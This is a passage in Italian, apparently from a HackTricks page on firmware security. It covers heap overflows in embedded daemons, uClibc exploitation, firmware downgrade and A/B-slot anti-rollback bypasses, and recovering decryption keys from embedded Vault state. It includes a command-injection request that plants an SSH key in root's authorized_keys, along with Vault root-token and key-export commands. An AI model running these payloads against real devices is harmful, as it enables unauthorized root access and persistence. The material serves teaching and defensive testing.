- Esegui il reverse engineering del dispatcher dei comandi finché non trovi l'**handler riservato al produttore**.
- Ricostruisci le tabelle di **stato FSM**, **evento**, **check**, **azione** e **stato successivo**.
- Individua gli **stati di transizione** che avanzano automaticamente e i branch di retry/errore che alla fine ripristinano o liberano lo stato controllato dall'attaccante.
- Verifica quali scambi di protocollo legittimi servono per portare il daemon nello stato vulnerabile, invece di presumere che l'handler vulnerabile sia sempre raggiungibile.

Per i protocolli sensibili al timing, il replay dei pacchetti da un framework Python potrebbe essere troppo lento. Un approccio più affidabile consiste nell'emulare un dispositivo legittimo su hardware reale (ad esempio un **nRF52840**) usando uno stack di livello produttore, così da esporre gli **endpoint**, gli **attributi** e il timing di commissioning corretti.

### Classe di bug nei download frammentati nei daemon embedded

Una classe ricorrente di bug del firmware si presenta nei download **frammentati di blob/modelli/configurazioni**:<sup>[[8]](#references)</sup>

1. Il **primo frammento** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi convalidano solo i campi **locali al pacchetto** controllati dall'attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare che la dimensione non superi quella **allocata in origine**.

Questo consente all'attaccante di inviare:

- Un primo frammento valido con una dimensione totale dichiarata **piccola**, per forzare una piccola allocazione heap.
- Un frammento successivo con l'**offset previsto** ma un `chunk_len` maggiore.
- Una dimensione locale al pacchetto falsificata che supera i nuovi controlli, ma provoca comunque un overflow del buffer allocato in origine.

Quando il percorso vulnerabile è protetto dalla logica di commissioning, lo sfruttamento deve includere un livello sufficiente di **emulazione del dispositivo** per portare il target nello stato previsto di download del modello o del blob prima di inviare i frammenti malformati.

### Trigger di `free()` guidati dal protocollo

Nei daemon embedded, spesso il modo più semplice per attivare lo sfruttamento dei metadati heap non è "aspettare la pulizia", ma **forzare la gestione degli errori del protocollo**:<sup>[[8]](#references)</sup>

- Invia frammenti successivi malformati per portare la FSM negli stati di **retry** o **errore**.
- Supera la soglia di retry affinché il daemon **reimposti il contesto** e liberi il buffer corrotto.
- Usa questo `free()` prevedibile per attivare primitive lato allocator prima che il processo vada in crash per altri motivi.

Questo è particolarmente utile contro allocator **simili a musl/uClibc/dlmalloc** in Linux embedded, dove la corruzione dei metadati dei chunk può trasformare la logica unlink/unbin in una primitiva di scrittura. Un pattern stabile consiste nel corrompere un **campo size** per reindirizzare l'attraversamento dell'allocator verso **fake chunk predisposti all'interno del buffer in overflow**, invece di sovrascrivere subito i puntatori reali delle bin e mandare il processo in crash.

## Sfruttamento binario e proof-of-concept

Lo sviluppo di una PoC per le vulnerabilità individuate richiede una profonda comprensione dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni runtime binarie sono rare nei sistemi embedded, ma quando sono presenti potrebbero essere necessarie tecniche come Return Oriented Programming (ROP).

### Note sullo sfruttamento dei fastbin di uClibc (Linux embedded)

- **Fastbin + consolidamento:** uClibc usa fastbin simili a quelli di glibc. Una successiva allocazione di grandi dimensioni può attivare `__malloc_consolidate()`, quindi ogni fake chunk deve superare i controlli (size plausibile, `fd = 0` e chunk circostanti considerati "in use").<sup>[[6]](#references)</sup>
- **Binari non-PIE con ASLR:** se ASLR è abilitato ma il binario principale è **non-PIE**, gli indirizzi `.data/.bss` all'interno del binario sono stabili. Puoi puntare a una regione che assomiglia già a un header valido di heap chunk per indirizzare un'allocazione fastbin su una **tabella di puntatori a funzione**.
- **NUL che interrompe il parser:** quando viene analizzato JSON, un `\x00` nel payload può interrompere il parsing lasciando i byte controllati dall'attaccante successivi disponibili per uno stack pivot/ROP chain.
- **Shellcode tramite `/proc/self/mem`:** una ROP chain che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può inserire shellcode eseguibile in una mapping nota e passarvi l'esecuzione.

## Sistemi operativi preconfigurati per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) ed [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per i test di sicurezza del firmware, dotati degli strumenti necessari.

## Sistemi operativi preconfigurati per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire valutazioni della sicurezza e penetration testing dei dispositivi Internet of Things (IoT). Ti fa risparmiare tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già installati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per i test di sicurezza embedded, basato su Ubuntu 18.04 e dotato di strumenti per i test di sicurezza del firmware.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento non sicuri

Anche quando un produttore implementa controlli delle firme crittografiche per le immagini firmware, **spesso omette la protezione dal rollback di versione (downgrade)**. Se il bootloader o il recovery loader verifica la firma usando una chiave pubblica incorporata, ma non confronta la *versione* (o un contatore monotono) dell'immagine da installare, un attaccante può installare legittimamente un **firmware precedente e vulnerabile, ancora dotato di una firma valida**, reintroducendo così vulnerabilità già corrette.<sup>[[4]](#references)</sup>

Workflow tipico dell'attacco:

1. **Ottieni un'immagine firmata precedente**
   * Scaricala dal portale di download pubblico del produttore, dalla CDN o dal sito di supporto.
   * Estraila dalle applicazioni mobile/desktop complementari (ad esempio da `assets/firmware/` all'interno di un APK Android).
   * Recuperala da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Carica o fornisci l'immagine al dispositivo** attraverso un canale di aggiornamento esposto:
   * UI Web, API dell'app mobile, USB, TFTP, MQTT, ecc.
   * Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e avviano il ripristino/aggiornamento.
3. Dopo il downgrade, sfrutta una vulnerabilità corretta nella versione più recente (ad esempio un filtro contro la command injection aggiunto in seguito).
4. Facoltativamente, installa di nuovo l'immagine più recente o disabilita gli aggiornamenti per evitare di essere individuato dopo aver ottenuto la persistenza.

### Esempio: command injection dopo il downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Nel firmware vulnerabile (con versione retrocessa), il parametro `md5` viene concatenato direttamente a un comando shell senza sanitizzazione, consentendo l’injection di comandi arbitrari (in questo caso, abilitando l’accesso root tramite chiave SSH). Le versioni successive del firmware hanno introdotto un filtro di base dei caratteri, ma l’assenza di protezione dal downgrade rende vana la correzione.<sup>[[4]](#references)</sup>

### Estrazione del firmware dalle app mobile

Molti vendor includono immagini firmware complete nelle app mobile companion, così che l’app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati non cifrati nell’APK/APEX, in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o anche il semplice `unzip` consentono di estrarre immagini firmate senza accedere all’hardware fisico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass dell'anti-rollback limitato all'updater nei design con slot A/B

Alcuni vendor implementano un **ratchet** anti-downgrade, ma solo nella logica dell'*updater* (per esempio, una routine UDS su CAN, un comando di recovery o un agente OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/CRC dell'immagine e si fida della tabella delle partizioni o dei metadati degli slot, la protezione contro il rollback può comunque essere aggirata.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore di versione sia un **ratchet di sicurezza** / contatore monotono.
- L'updater confronta il ratchet dell'immagine con un valore memorizzato in uno storage persistente e rifiuta le immagini firmate più vecchie.
- Il bootloader **non** analizza quel ratchet e verifica solo header, CRC e firma prima di avviare lo slot selezionato.
- L'attivazione dello slot è memorizzata separatamente in una tabella delle partizioni o in un contatore di generazione per slot e **non è associata crittograficamente** all'esatto digest del firmware che è stato convalidato.

Nei sistemi dual-slot questo crea una primitiva **convalida un'immagine / avvia un'altra immagine**. Se l'attaccante riesce a far impostare all'updater lo slot B come prossimo target di avvio usando un'immagine firmata corrente e poi può sovrascrivere lo slot B prima del riavvio, il bootloader potrebbe comunque avviare l'immagine retrocessa, perché si fida solo dei metadati dello slot già salvati.

Schema di abuso comune:

1. Carica un firmware **firmato corrente** nello slot passivo ed esegui la normale routine di convalida/cambio, in modo che il layout imposti quello slot come prossimo slot attivo.
2. **Non riavviare ancora**. Nella stessa sessione, richiama la routine di preparazione/cancellazione dello slot.
3. Sfrutta uno stato di avvio obsoleto o una logica di selezione dello slot non aggiornata, in modo che l'updater cancelli **lo stesso slot fisico** appena promosso.
4. Scrivi in quello slot un firmware **più vecchio ma ancora firmato**.
5. Salta la routine di convalida che applica il ratchet e riavvia direttamente.
6. Il bootloader seleziona lo slot promosso, verifica solo firma/integrità e avvia la vecchia immagine.

Quando si analizzano le implementazioni di aggiornamento A/B, cerca:

- Selezione dello slot derivata da **flag di avvio** che non vengono aggiornati dopo un cambio riuscito.
- Una routine del tipo `prepare_passive_slot()` che cancella uno slot in base a uno stato obsoleto invece che al **layout attualmente salvato**.
- Una funzione del tipo `part_write_layout()` che incrementa solo un **contatore di generazione** / flag di attivazione e non memorizza l'hash dell'immagine convalidata.
- Controlli del ratchet implementati in userspace o nel codice dell'updater, ma **non** nelle fasi ROM / bootloader / secure boot.
- Routine di cancellazione o recovery che lasciano lo slot contrassegnato come avviabile anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di aggiornamento

* Il trasporto/l'autenticazione dell'*endpoint di aggiornamento* sono adeguatamente protetti (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore anti-rollback monotono** prima del flashing?
* L'immagine viene verificata all'interno di una catena di secure boot (per esempio, con firme controllate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell'updater, invece di controllare solo firma/CRC?
* I metadati di attivazione dello slot sono **associati al digest/alla versione del firmware convalidato**, o è possibile modificare uno slot dopo la promozione?
* Dopo il cambio di slot, il dispositivo è costretto a riavviarsi oppure le successive routine di aggiornamento/cancellazione sono ancora raggiungibili nella stessa sessione?
* Il codice userland esegue ulteriori controlli di coerenza (per esempio, sulla mappa delle partizioni consentita o sul numero di modello)?
* I flussi di aggiornamento *parziale* o di *backup* riutilizzano la stessa logica di convalida?

> 💡  Se manca uno qualsiasi degli elementi sopra, è probabile che la piattaforma sia vulnerabile ad attacchi di rollback.

## Firmware vulnerabile per esercitarsi

Per esercitarti a individuare vulnerabilità nel firmware, usa i seguenti progetti di firmware vulnerabile come punto di partenza.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recupero delle chiavi di decrittazione del firmware dallo stato KMS/Vault incorporato

Quando un'immagine di aggiornamento combina piccoli metadati in chiaro con un grande blob ad alta entropia, analizza prima il contenitore invece di tentare subito il brute force:<sup>[[1]](#references)</sup>

- Estrai header, offset e limiti di riga con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` indica solitamente il formato OpenSSL `enc`: i successivi 8 byte sono il salt e i byte rimanenti sono il ciphertext.
- Un campo Base64 che, una volta decodificato, è esattamente di `256` byte è un forte indizio che si tratti di un ciphertext RSA-2048 che avvolge una password del firmware/chiave di sessione casuale.
- Il materiale PGP separato nello stesso file spesso protegge solo l'autenticità; non dare per scontato che sia il meccanismo di riservatezza.

Se la ricerca statica delle chiavi (`grep`, `strings`, ricerche PEM/PGP) non dà risultati, analizza a ritroso il **percorso operativo di decrittazione** invece di limitarti a cercare chiavi private:

- Decompila il binario dell'updater / di gestione e segui il percorso: chi legge il blob cifrato, quale helper/API lo decifra e quale nome logico della chiave viene richiesto.
- Cerca nello root filesystem estratto lo stato KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file unit e agli script di init.
- Considera le istruzioni in chiaro `vault operator unseal ...`, le chiavi di recovery, i token di bootstrap o gli script locali di auto-unseal KMS equivalenti a materiale di chiave privata.

Se l'appliance include il binario Vault originale e il backend di storage, riprodurre quell'ambiente è solitamente più semplice che reimplementare le funzionalità interne di Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root sul KMS clonato:

- Rendi le chiavi transit esportabili solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la chiave unwrap: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata usando la coppia esatta di padding/hash utilizzata dal KMS. Un errore di decrittazione PKCS#1 v1.5 e un errore di decrittazione OAEP predefinita **non** dimostrano che la chiave sia sbagliata; molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie più comuni usano SHA-1 come impostazione predefinita.
- Se il payload inizia con `Salted__`, riproduci esattamente la KDF OpenSSL del vendor (`EVP_BytesToKey`, spesso MD5 sugli appliance legacy) prima di tentare la decrittazione AES-CBC.

Questo trasforma il problema del "firmware cifrato" in una questione più generale: **recuperare le chiavi operative lato appliance, quindi riprodurre offline i parametri esatti di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craccare il firmware con Claude: competenze da senior, autonomia da junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di test della sicurezza del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva per attaccare l'Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day in hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso a casa tua](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora mi vedi: ora sei pwnato](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dal connettore della porta di ricarica - Parte 2: aggirare l'anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: sfruttamento over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS su QEMU, parte 1: spacchettamento](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentazione del kernel Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS su QEMU, parte 2: debugging e correzione](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Password del BIOS Dell: la debole cifratura XOR permette il recupero dalla SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Strumenti per il recupero delle password del BIOS Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
